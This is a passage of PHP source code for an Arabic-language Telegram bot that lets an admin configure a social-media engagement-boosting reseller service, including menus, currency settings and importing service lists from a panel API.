          *
          ارسل يوزر القناة الان مع @
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
          $modes['mode'][$from_id]  = $data;
SETJSON($rshq); SETJSON12($modes);
      }else{
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          هذا القسم للمشتركين المدفوعين فقط
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
      }
    }
  }

  if($data == "setbuy"){
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
      if(true){
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          ارسل كليشه شراء $name3mla الان
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
          $modes['mode'][$from_id]  = $data;
SETJSON($rshq); SETJSON12($modes);
      }else{
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          هذا القسم للمشتركين المدفوعين فقط
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
      }
    }
  }
  
  if($data == "setshare"){
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
      if(true){
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          ارسل عدد ال$name3mla الان
          $name3mla مشاركه رابط لدعوه، 
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
          $modes['mode'][$from_id]  = $data;
SETJSON($rshq); SETJSON12($modes);
      }else{
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          هذا القسم للمشتركين المدفوعين فقط
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
      }
    }
  }

if(is_numeric($text) and $modes['mode'][$from_id]== "setshare"){
    if(true){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"
        *
        تم تعيين عدد ال$name3mla
        *
        ",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode($admnb)
        ]);
        $rshq["coinshare"] = $text;
        $modes['mode'][$from_id]  = null;
SETJSON($rshq); SETJSON12($modes);
    }
  }


  if($text and $modes['mode'][$from_id]== "setbuy"){
    if(true){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"
        *
        تم تعيين الكليشه
        *
        ",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode($admnb)
        ]);
        $rshq['buy']  = $text;
        $modes['mode'][$from_id]  = null;
SETJSON($rshq); SETJSON12($modes);
    }
  }

  $chabot = $rshq['cha']; if ($chabot == null){$chabot = "sero_bots";}


  if($text and $modes['mode'][$from_id]== "setname"){
    if(true){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"
        *
        تم تعيين اسم البوت
        *
        ",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode($admnb)
        ]);
        $rshq['namebot']  = $text;
        $modes['mode'][$from_id]  = null;
SETJSON($rshq); SETJSON12($modes);
    }
  }

  $nambot = $rshq['namebot']; if($nambot == null){$nambot = "SERO";}

  if($text and $modes['mode'][$from_id]== "settext"){
    if(true){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"
        *
        تم تعيين الكليشه بنجاح
        *
        ",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode($admnb)
        ]);
        $rshq['KLISHA']  = $text;
        $modes['mode'][$from_id]  = null;
SETJSON($rshq); SETJSON12($modes);
    }
  }

  if($text and $modes['mode'][$from_id]== "setcha"){
    if(true){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"
        *
        تم تعيين القناة بنجاح
        *
        ",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode($admnb)
        ]);
        $rshq['cha']  = str_replace("@","",$text);
        $modes['mode'][$from_id]  = null;
SETJSON($rshq); SETJSON12($modes);
    }
  }

if($rshq['AKTHAR']==null){	
  $AKTHAR=20;
  }else{
$AKTHAR = $rshq['AKTHAR'];
  }

  if($rshq["HDIA"] == null or $rshq["HDIA"] == "on"){
  $HDIAS = "الهدية🎁";
  $mj = "✅";
  }else{
    $HDIAS = null;
    $mj = "❌";
  }
  if($treqa == null){
    $treqa = "لم يتم التعرف علي الطريقه او لم تقم بوضع معلومات الرشق";
  }


  

  if($data == "timerx") {
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    bot('EditMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$message_id,
  'text'=>"
- عزيزي المطور [$name](tg://user?id=$from_id)
~ قسم الوقتي الخاص بنضام البوت ( ان كنت لاتعرف ما معني هذا قم يمراسله مطور الصانع )
~ @V44VV
  ",
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($timerx)
  ]);
  
  $modes['mode'][$from_id]  = null;
  SETJSON($rshq); SETJSON12($modes);
  }
  }
  
  if($data == "istqbals") {
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    bot('EditMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$message_id,
  'text'=>"
- عزيزي المطور [$name](tg://user?id=$from_id)
~ يمكنك التحكم في الفتح والقفل 
  ",
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($istqbals)
  ]);
  
  $modes['mode'][$from_id]  = null;
  SETJSON($rshq); SETJSON12($modes);
  }
  }

  if($data == "tmoilsc") {
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    bot('EditMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$message_id,
  'text'=>"
- عزيزي المطور [$name](tg://user?id=$from_id)
~ قسم التمول ةاعدادات التمويل
  ",
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($tmoilsc)
  ]);
  
  $modes['mode'][$from_id]  = null;
  SETJSON($rshq); SETJSON12($modes);
  }
  }
  
  if($data == "adders1") {
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    bot('EditMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$message_id,
  'text'=>"
- عزيزي المطور [$name](tg://user?id=$from_id)
~ قسم الأضافه والتصفير للنقاط 
  ",
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($adders1)
  ]);
  
  $modes['mode'][$from_id]  = null;
  SETJSON($rshq); SETJSON12($modes);
  }
  }

  if($data == "settingcoin") {
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    bot('EditMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$message_id,
  'text'=>"
- عزيزي المطور [$name](tg://user?id=$from_id)
~ قسم تعيين النقاط للاعدادات
  ",
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($settingcoin)
  ]);
  
  $modes['mode'][$from_id]  = null;
  SETJSON($rshq); SETJSON12($modes);
  }
  }
  
  if($data == "Hdias_j") {
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    bot('EditMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$message_id,
  'text'=>"
- عزيزي المطور [$name](tg://user?id=$from_id)
~ قسم الهدايا والكودات
  ",
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($hdias_j)
  ]);
  
  $modes['mode'][$from_id]  = null;
  SETJSON($rshq); SETJSON12($modes);
  }
  }
  
  if($data == "texters") {
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    bot('EditMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$message_id,
  'text'=>"
- عزيزي المطور [$name](tg://user?id=$from_id)
~ قسم الكلايش والحقوق
  ",
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($texters)
  ]);
  
  $modes['mode'][$from_id]  = null;
  SETJSON($rshq); SETJSON12($modes);
  }
  }


function getServerSpeed() {
    $start_time = microtime(true);

    // Make a loopback request to the server itself
    $ch = curl_init('http://' . $_SERVER['SERVER_NAME']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    $end_time = microtime(true);

    if ($response !== false) {
        $speed = $end_time - $start_time;
        return $speed;
    } else {
        return false; 
    }
}

$server_speed = getServerSpeed();

if ($server_speed !== false) {
    $good_speed_threshold = 0.1; 

    if ($server_speed < $good_speed_threshold) {
        $JP = "سرعه جيده " . round($server_speed, 4) . " في الثانيه";
    } else {
        $JP = "بطيئه " . round($server_speed, 4) . "في الثانيه ";
    }
} else {
    $JP = "Unable to fetch the loopback URL. Check your server configuration.";
}

  $nambot = $rshq['namebot']; if($nambot == null){$nambot = "SERO";}
if($data == "rshqG" or $data == "home_s") {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
‹ : اعدادات بوت الرشق الخاصه بك
‹ : عزيزي المطور 『 [$name](tg://user?id=$from_id) 』

🌐 رصيدك في الموقع: $flos$
💰 العملة في الموقع: $treqa

🔄 أقل عدد لتحويل ال$name3mla: $AKTHAR
🌍 اسم العملة الحالية في البوت: *$name3mla*
🎁 عدد الهدية اليومية: `". ($rshq['hdias'] ?? "20") ."`
🔍 عدد الأقسام في البوت: *". count($rshq['qsm']) ."*
🛠️ عدد الخدمات داخل البوت: *". count($rshq['xdmaxs']) ."*
🤖 اسم البوت الحالي: *$nambot *

~ سرعه البوت : $JP

",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($adm)
]);

$modes['mode'][$from_id]  = null;
SETJSON($rshq); SETJSON12($modes);
}
}



if($data == "VIPME") {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    if(true){
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*
يمكنك الاستمتاع بمميزات مدفوعه هنا
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnvip)
]);
$modes['mode'][$from_id]  = null;
SETJSON($rshq); SETJSON12($modes);
  }else{
    bot('EditMessageText',[
      'chat_id'=>$chat_id,
      'message_id'=>$message_id,
      'text'=>"
      *
      هذا القسم للمشتركين المدفوعين فقط
      *
      ",
      'parse_mode'=>"markdown",
      'reply_markup'=>json_encode($admnb)
      ]);
  }
}
}

if ($data == "setJa") {
  if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    bot('EditMessageText', [
      'chat_id' => $chat_id,
      'message_id' => $message_id,
      'text' => "
      *
    ارسل كليشه الجوائز الان ياحبيبي
      *
      ",
      'parse_mode' => "markdown",
      'reply_markup' => json_encode([
        'inline_keyboard' => [

          [['text' => 'رجوع', 'callback_data' => "rshqG"]],
        ]
      ])
    ]);
    $modes['mode'][$from_id] = $data;
    $rshq = json_encode($rshq, 32 | 128 | 265);
    file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
  }
}

if($text and $modes['mode'][$from_id] == "setJa"){
  if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    bot('sendmessage', [
      'chat_id' => $chat_id,
      'message_id' => $message_id,
      'text' => "
      *
   تم تعين الجوائز بنجاح 
      *
      ",
      'parse_mode' => "markdown",
      'reply_markup' => json_encode([
        'inline_keyboard' => [

          [['text' => 'رجوع', 'callback_data' => "rshqG"]],
        ]
      ])
    ]);
    $rshq['JAWA'] = $text;
    $modes['mode'][$from_id] = null;
    $rshq = json_encode($rshq, 32 | 128 | 265);
    file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
  }
}

if ($data == "offr") {
  if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    bot('EditMessageText', [
      'chat_id' => $chat_id,
      'message_id' => $message_id,
      'text' => "
      *
     تم القفل
      *
      ",
      'parse_mode' => "markdown",
      'reply_markup' => json_encode([
        'inline_keyboard' => [

          [['text' => 'رجوع', 'callback_data' => "rshqG"]],
        ]
      ])
    ]);
    $modes['mode'][$from_id] = null;
    $rshq['FREE'] = null;
    $rshq = json_encode($rshq, 32 | 128 | 265);
    file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
  }
}

if ($data == "onfr") {
  if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    bot('EditMessageText', [
      'chat_id' => $chat_id,
      'message_id' => $message_id,
      'text' => "
      *
     تم الفتح 
      *
      ",
      'parse_mode' => "markdown",
      'reply_markup' => json_encode([
        'inline_keyboard' => [

          [['text' => 'رجوع', 'callback_data' => "rshqG"]],
        ]
      ])
    ]);
    $modes['mode'][$from_id] = null;
    $rshq['FREE'] = "TR";
    $rshq = json_encode($rshq, 32 | 128 | 265);
    file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
  }
}


if ($data == "xdmat") {
    if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
      bot('EditMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "
        *
🛠️ قسم الخدمات في البوت 🛠️
~ هذا القسم قسم اساسي يعتبر داخل اعدادات الرشق
~ فهو يقوم بأضافه اقسام وخدمات من هنا
        *
        ",
        'parse_mode' => "markdown",
        'reply_markup' => json_encode([
          'inline_keyboard' => [
            [["text" => "- الدخول الي الأقسام .","callback_data"=>"qsmsa"]],
            [['text' => 'رجوع', 'callback_data' => "rshqG"]],
          ]
        ])
      ]);
      $modes['mode'][$from_id] = null;
      $rshq = json_encode($rshq, 32 | 128 | 265);
      file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
    }
  }

  $task_ex = explode("assasi_", $data)[1];
  
  if ($task_ex) {
      $Y = $rshq['taskera'][$task_ex];
  
      if ($Y == "✅") {
          $t = "❌";
          bot('answerCallbackQuery', [
              'callback_query_id' => $update->callback_query->id,
              'text' => "• تم التعطيل",
              'show_alert' => false
          ]);
      } elseif ($Y == "❌" or $Y == null) {
          $t = "✅";
          bot('answerCallbackQuery', [
              'callback_query_id' => $update->callback_query->id,
              'text' => "• تم التفعيل",
              'show_alert' => false
          ]);
  
          if ($rshq['tasker_mns'][$task_ex] != true) {
              switch ($task_ex) {
                  case "insta":
                      $text = "انستغرام 🩷 ";
                      break;
                  case "tik":
                      $text = "تيك توك 🖤";
                      break;
                  case "telegram":
                      $text = "تيليغرام 💙";
                      break;
                  case "youtube":
                      $text = "يوتيوب ❤️";
                      break;
                  case "face":
                      $text = "فيس بوك 🤍";
                      break;
                  case "twit":
                      $text = "تويتر 💙";
                      break;
                  case "thread":
                      $text = "ثريدز 🖤";
                      break;
                  default:
                      $text = "";
              }
  
              $bbERO = "BERO" . rand(0, 999999999999999);
              $rshq['qsm'][] = $text . '-' . $bbERO;
              $rshq['NAMES'][$bbERO] = $text;
              $rshq['tasker_mns'][$task_ex] = true;
              $rshq['tasker_mcoide'][$task_ex] = $bbERO;
          }
      }
      $rshq['taskera'][$task_ex] = $t;
      SETJSON($rshq);
  
      $key = ['inline_keyboard' => []];
      $key['inline_keyboard'][] = [
          ['text' => "انستغرام 🩷 " . ($rshq['taskera']["insta"] ?? "❌"), 'callback_data' => "assasi_insta"],
          ['text' => "تيك توك 🖤 " . ($rshq['taskera']["tik"] ?? "❌"), 'callback_data' => "assasi_tik"]
      ];
      $key['inline_keyboard'][] = [
          ['text' => "تيليغرام 💙 " . ($rshq['taskera']["telegram"] ?? "❌"), 'callback_data' => "assasi_telegram"]
      ];
      $key['inline_keyboard'][] = [
          ['text' => "يوتيوب ❤️ " . ($rshq['taskera']["youtube"] ?? "❌"), 'callback_data' => "assasi_youtube"],
          ['text' => "فيس بوك 🤍 " . ($rshq['taskera']["face"] ?? "❌"), 'callback_data' => "assasi_face"]
      ];
      $key['inline_keyboard'][] = [
          ['text' => "تويتر 💙 " . ($rshq['taskera']["twit"] ?? "❌"), 'callback_data' => "assasi_twit"],
          ['text' => "ثريدز 🖤 " . ($rshq['taskera']["thread"] ?? "❌"), 'callback_data' => "assasi_thread"]
      ];
      $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "qsmsa"]];
  
      bot('EditMessageText', [
          'chat_id' => $chat_id,
          'message_id' => $message_id,
          'text' => "*- الاقسام الاساسيات الجاهزه للأضافه . \n يمكنك تفعيلها وتعطيلها بأي وقت*",
          'parse_mode' => "markdown",
          'reply_markup' => json_encode($key),
      ]);
  
      $modes['mode'][$from_id] = null;
      SETJSON12($modes);
  }


   if ($data == "asaiasis") {
    $key = ['inline_keyboard' => []];
    $key['inline_keyboard'][] = [
      [
          'text' => "انستغرام 🩷 " . ($rshq['taskera']["insta"] ?? "❌"),
          'callback_data' => "assasi_insta"
      ],
      [
          'text' => "تيك توك 🖤 " . ($rshq['taskera']["tik"] ?? "❌"),
          'callback_data' => "assasi_tik"
      ]
  ];
  $key['inline_keyboard'][] = [
      [
          'text' => "تيليغرام 💙 " . ($rshq['taskera']["telegram"] ?? "❌"),
          'callback_data' => "assasi_telegram"
      ]
  ];
  $key['inline_keyboard'][] = [
      [
          'text' => "يوتيوب ❤️ " . ($rshq['taskera']["youtube"] ?? "❌"),
          'callback_data' => "assasi_youtube"
      ],
      [
          'text' => "فيس بوك 🤍 " . ($rshq['taskera']["face"] ?? "❌"),
          'callback_data' => "assasi_face"
      ]
  ];
  $key['inline_keyboard'][] = [
      [
          'text' => "تويتر 💙 " . ($rshq['taskera']["twit"] ?? "❌"),
          'callback_data' => "assasi_twit"
      ],
      [
          'text' => "ثريدز 🖤 " . ($rshq['taskera']["thread"] ?? "❌"),
          'callback_data' => "assasi_thread"
      ]
  ];
  
    $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "qsmsa"]];

    bot('EditMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "*- الاقسام الاساسيات الجاهزه للأضافه . \n يمكنك تفعيلها وتعطيلها بأي وقت*",
        'parse_mode' => "markdown",
        'reply_markup' => json_encode($key),
    ]);

    $modes['mode'][$from_id] = null;
    SETJSON($rshq);
    SETJSON12($modes);
}
  if ($data == "qsmsa") {
    $key = ['inline_keyboard' => []];
    foreach ($rshq['qsm'] as $i) {
        $nameq = explode("-", $i)[0];
        $i = explode("-", $i)[1];
        $trimmedName = $nameq; // Limit to 10 characters
        if ($rshq['IFWORK>'][$i] != "NOT") { // Replace 'true' with your actual condition
            $key['inline_keyboard'][] = [
                ['text' => "$trimmedName", 'callback_data' => "edits|$i"],
                ['text' => "", 'callback_data' => "delets|i"]
            ];
        }
    }
    $key['inline_keyboard'][] = [['text' => "+ اضافة قسم جديد", 'callback_data' => "addqsm"]];
    $key['inline_keyboard'][] = [['text' => "ألأقسام ألأساسيه", 'callback_data' => "asaiasis"]];
    $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "rshqG"]];

    bot('EditMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "*الأقسام الموجودة في البوت*",
        'parse_mode' => "markdown",
        'reply_markup' => json_encode($key),
    ]);

    $modes['mode'][$from_id] = null;
    SETJSON($rshq);
    SETJSON12($modes);
}



if(explode("|",$data)[0] == "delets"){

  $rshq['IFWORK>'][explode("|",$data)[1]] = "NOT";
  $modes['mode'][$from_id] = null;
  SETJSON($rshq); SETJSON12($modes);


  $key = ['inline_keyboard' => []];
  foreach ($rshq['qsm'] as $i) {
    $nameq = explode("-",$i)[0];
    $i = explode("-",$i)[1];
    if($rshq['IFWORK>'][$i] != "NOT"){
    $key['inline_keyboard'][] = [['text' => "$nameq", 'callback_data' => "edits|$i"], ['text' => "", 'callback_data' => "delets|i"]];
  }
}
  $key['inline_keyboard'][] = [['text' => "+ اضافه قسم جديد", 'callback_data' => "addqsm"]];
  $key['inline_keyboard'][] = [['text' => "ألأقسام ألأساسيه", 'callback_data' => "qsmers"]];
  $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "rshqG"]];
  bot('EditMessageText', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "
    *
    الاقسام الموجوده في البوت
    *
    ",
    'parse_mode' => "markdown",
    'reply_markup' => json_encode($key),
  ]);
}

if($chat_id == 5561152568){
  $tt = "قسم الاضافه السريعه [ تلقائي ]";
}
$UUS = explode("|", $data);
if(explode("|",$data)[0]=="edits"){
  $key = ['inline_keyboard' => []];
  $vv = rand(100,900);

  foreach ( $rshq['xdmaxs'][explode("|",$data)[1]] as $hjjj => $i) {

    $key['inline_keyboard'][] = [['text' => "$i", 'callback_data' => "editss|".explode("|",$data)[1]."|$hjjj"], ['text' => "🗑", 'callback_data' => "delt|".explode("|",$data)[1]."|$hjjj"]];
  }

  $bbERO = explode("|",$data)[1];
  $key['inline_keyboard'][] = [['text' => "+ أضافه خدمه يدويه", 'callback_data' => "add|$bbERO"]];
  $key['inline_keyboard'][] = [['text' => "قسم الاضافه السريعه [ تلقائي ]", 'callback_data' => "addauto|$bbERO"]];
  $key['inline_keyboard'][] = [['text' => "مسح هذا القسم", 'callback_data' => "delets|$bbERO"]];
  $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "rshqG"]];
  bot('EditMessageText', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "
    *
    الخدمات الموجوده في قسم *".$rshq['NAMES'][explode("|",$data)[1]]."*
    *
    ",
    'parse_mode' => "markdown",
    'reply_markup' => json_encode($key),
  ]);
  $modes['mode'][$from_id] = null;
  $rshq['idTIMER'][$vv] = $rshq['NAMES'][explode("|",$data)[1]];
  SETJSON($rshq); SETJSON12($modes);
}

if($UUS[0]=="addauto"){
  if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    bot('EditMessageText', [
      'chat_id' => $chat_id,
      'message_id' => $message_id,
      'text' => "
🌟
- أهلاً بك! خلال الفترة الأخيرة، تمت إضافة ميزة جديدة لتسهيل إضافة الخدمات للمستخدمين.
- يمكنك الآن إضافة خدمات مباشرة من خلال قسم الخدمات المتاحة في الموقع إلى بوتك.
- لاستخدام هذه الخدمة، يجب عليك وضع (موقع الرشق وتوكن الموقع) لبدء تشغيلها.
- بمجرد وضع هذه المعلومات، اضغط على الزر أدناه وابدأ استخدام الخدمة الجديدة!

👇

      ",
      'parse_mode' => "markdown",
      'reply_markup' => json_encode([
        'inline_keyboard' => [
          [['text' => 'تصفح الخدمات', 'callback_data' => "onlinerP|$UUS[1]"]],
          [['text' => 'رجوع', 'callback_data' => "edits|$UUS[1]"]],
        ]
      ])
    ]);
    $modes['mode'][$from_id] = "adders98"; 
    $rshq['idxs'][$from_id] = $UUS[1];
    $rshq = json_encode($rshq, 32 | 128 | 265);
    file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
  }
}

mkdir('time_back');
$tym = json_decode(file_get_contents('time_back/'.$chat_id.'_'.USR_BOT),1);

if($UUS[0]=="onlinerP"){
  if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    $keytr=[];
    $domen = "kd1s.com" ; //دومين موقع الرشق
$key = "999" ; //توكن لموقع
$api = json_decode(file_get_contents("https://".$rshq["sSite"]."/api/v2?key=$Api_Tok&action=services"));
for($i=0;$i <= 10;$i++){
$namem = $api[$i]->name ;
$id = $api[$i]->service ;
$s3r = $api[$i]->rate ;
$min = $api[$i]->min ;
$mix = $api[$i]->max ;
$category = $api[$i]->category ;
    if($namem) {
      $keytr[inline_keyboard][]=[['text'=>"$namem",'callback_data'=>"servicem|$id|$UUS[1]"]];
      $tym[$id]="$namem|$mix|$min|$id|$s3r";
      file_put_contents('time_back/'.$chat_id.'_'.USR_BOT,json_encode($tym));
    }
    }
    $keytr[inline_keyboard][]=[['text'=>"▶️ التالي",'callback_data'=>"cnc|2|$UUS[1]"]];
    $keytr[inline_keyboard][]=[['text'=>"رجوع",'callback_data'=>"addauto|$UUS[1]"]];

    bot('EditMessageText', [
      'chat_id' => $chat_id,
      'message_id' => $message_id,
      'text' => "
*🚀 التصفح السريع عزيزي المطور *[$name](tg://user?id=$chat_id) 🚀

~ اضغط على الخدمة المناسبة لإضافتها تلقائياً.

- يتم عرض (10) خدمات. يمكنك عرض المزيد من خلال النقر على الإيموجي أدناه.

*🔹 🔹 🔹 🔹 🔹 🔹 🔹 🔹 🔹 🔹*

      ",
      'parse_mode' => "markdown",
      'reply_markup' => json_encode($keytr)
    ]);
    $modes['mode'][$from_id] = "adders98"; 
    $rshq['idxs'][$from_id] = $UUS[1];
    $rshq = json_encode($rshq, 32 | 128 | 265);
    file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
  }
}

if(explode('|',$data)[0] == 'servicem'){
  $id = explode('|',$data)[1];
  $id_qsm = explode('|',$data)[2];
  $string = $tym[$id];
  list($namem, $mix, $min, $id, $s3r) = explode('|', $string);
  $nameqsm = $rshq['NAMES'][$id_qsm];
  $bop = bot('EditMessageText', [
      'chat_id' => $chat_id,
      'message_id' => $message_id,
      'text' => "
🚀 الإضافة السريعة (لقسم $nameqsm)

🔧 اسم الخدمة: [$namem]
🆔 ايدي الخدمة: `$id`
🔍 ايدي القسم: `$id_qsm`
💵 الحد الأدنى: `$min`
💰 الحد الأقصى: `$mix`
💲 سعر الخدمة في الموقع: `$s3r`

~ تمت الإضافة تلقائياً
      ",
      'parse_mode' => "markdown",
      'reply_markup'=>json_encode([
        'inline_keyboard'=>[
        [['text'=>"$NamesBACK",'callback_data'=>"onlinerP|".$id_qsm]],
          
         ]
       ])

    ]);
    $modes['mode'][$from_id] = null;
    $rshq['idxs'][$from_id] = null;
    $rshq['xdmaxs'][$id_qsm][] = $namem;
    $idser = array_search($namem,$rshq['xdmaxs'][$id_qsm]);

    bot('sendmessage', [
      'chat_id' => $chat_id,
      'message_id' => $message_id,
      'text' => "
للدخول إلى خدمة [$namem] تلقائياً 🚀

~ اضغط على أسم الخدمه ⬇️
      ",
      'parse_mode' => "markdown",
      'reply_to_message_id' => $bop->result->message_id,
      'reply_markup'=>json_encode([
        'inline_keyboard'=>[
        [['text'=>"$namem",'callback_data'=>"editss|".$id_qsm."|$idser" ]],
        [['text'=>"$NamesBACK",'callback_data'=>"onlinerP|".$id_qsm]],
          
         ]
       ])

    ]);

    $rshq['Web'][$id_qsm][$idser] = $rshq["sSite"]  ;
    $rshq['key'][$id_qsm][$idser] = $rshq["sToken"]  ;
    $rshq['min'][$id_qsm][$idser] = $min;
    $rshq['mix'][$id_qsm][$idser] = $mix;
    $rshq['IDSSS'][$id_qsm][$idser] = $id;

    $rshq= json_encode($rshq,32|128|265);
    file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
}

if(explode('|',$data)[0] == 'cnc'){
  if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    $num = explode('|', $data)[1];
    $vbn = $num + 1;
    $num = $num * 10;
    $keytrm = [];
    $domen = "kd1s.com"; // دومين موقع الرشق
    $key = "999"; // توكن لموقع
    $api = json_decode(file_get_contents("https://" . $rshq["sSite"] . "/api/v2?key=$Api_Tok&action=services"));
    
    for ($i = $num; $i < min($num + 10, count($api)); $i++) {
      $namem = $api[$i]->name ;
      $id = $api[$i]->service ;
      $s3r = $api[$i]->rate ;
      $min = $api[$i]->min ;
      $mix = $api[$i]->max ;
      $category = $api[$i]->category ;
        
        if ($namem) {
            $keytrm['inline_keyboard'][] = [['text' => "$namem", 'callback_data' => "servicem|$id|".explode('|',$data)[2]]];
            $tym[$id]="$namem|$mix|$min|$id|$s3r";
            file_put_contents('time_back/'.$chat_id.'_'.USR_BOT,json_encode($tym));
        }
    }
    
    $keytrm['inline_keyboard'][] = [['text' => "▶️ التالي", 'callback_data' => "cnc|$vbn|".explode('|',$data)[2]]];
    $keytrm['inline_keyboard'][] = [['text' => "رجوع", 'callback_data' => "addauto|".explode('|',$data)[2]]];
    

    bot('EditMessageText', [
      'chat_id' => $chat_id,
      'message_id' => $message_id,
      'text' => "
*🚀 التصفح السريع عزيزي المطور *[$name](tg://user?id=$chat_id) 🚀
- الصفحه : (". explode('|',$data)[1].") 

~ اضغط على الخدمة المناسبة لإضافتها تلقائياً.

- يتم عرض (10) خدمات. يمكنك عرض المزيد من خلال النقر على الإيموجي أدناه.

*🔹 🔹 🔹 🔹 🔹 🔹 🔹 🔹 🔹 🔹*
      ",
      
      'parse_mode' => "markdown",
      'reply_markup' => json_encode($keytrm)
    ]);
    $modes['mode'][$from_id] = "adders98"; 
    $rshq['idxs'][$from_id] = $UUS[1];
    $rshq = json_encode($rshq, 32 | 128 | 265);
    file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
  }
}

if (explode("|", $data)[0] == "editss") {
